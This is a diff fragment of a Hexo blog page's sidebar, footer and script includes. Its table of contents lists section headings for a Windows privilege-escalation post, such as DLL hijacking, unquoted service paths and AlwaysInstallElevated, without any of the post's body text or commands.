+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文章目录"><span class="nav-number">1.</span> <span class="nav-text">文章目录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x10-MsSql-Escalate-Privilege"><span class="nav-number">1.1.</span> <span class="nav-text">0x10 MsSql Escalate Privilege</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MsSql基本操作"><span class="nav-number">1.1.1.</span> <span class="nav-text">MsSql基本操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章"><span class="nav-number">1.1.2.</span> <span class="nav-text">参考文章</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x20-内核"><span class="nav-number">1.2.</span> <span class="nav-text">0x20 内核</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x21-服务"><span class="nav-number">1.3.</span> <span class="nav-text">0x21 服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#不带引号的服务路径"><span class="nav-number">1.3.1.</span> <span class="nav-text">不带引号的服务路径</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不安全的服务权限"><span class="nav-number">1.3.2.</span> <span class="nav-text">不安全的服务权限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x22-dll"><span class="nav-number">1.4.</span> <span class="nav-text">0x22. dll</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dll劫持"><span class="nav-number">1.4.1.</span> <span class="nav-text">dll劫持</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-dll注入"><span class="nav-number">1.4.2.</span> <span class="nav-text">2.dll注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x23-注册表"><span class="nav-number">1.5.</span> <span class="nav-text">0x23 注册表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x24-计划任务-Administrator-to-SYSTEM"><span class="nav-number">1.6.</span> <span class="nav-text">0x24 计划任务(Administrator to SYSTEM)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x25-文件"><span class="nav-number">1.7.</span> <span class="nav-text">0x25. 文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#从浏览器文件中提取凭证"><span class="nav-number">1.7.1.</span> <span class="nav-text">从浏览器文件中提取凭证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#从远控工具中提取凭证"><span class="nav-number">1.7.2.</span> <span class="nav-text">从远控工具中提取凭证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#组策略首选项文件"><span class="nav-number">1.7.3.</span> <span class="nav-text">组策略首选项文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows密钥文件"><span class="nav-number">1.7.4.</span> <span class="nav-text">Windows密钥文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x26-错误配置"><span class="nav-number">1.8.</span> <span class="nav-text">0x26 错误配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#AlwaysInstallElevated"><span class="nav-number">1.8.1.</span> <span class="nav-text">AlwaysInstallElevated</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考文章-1"><span class="nav-number">1.8.2.</span> <span class="nav-text">参考文章</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
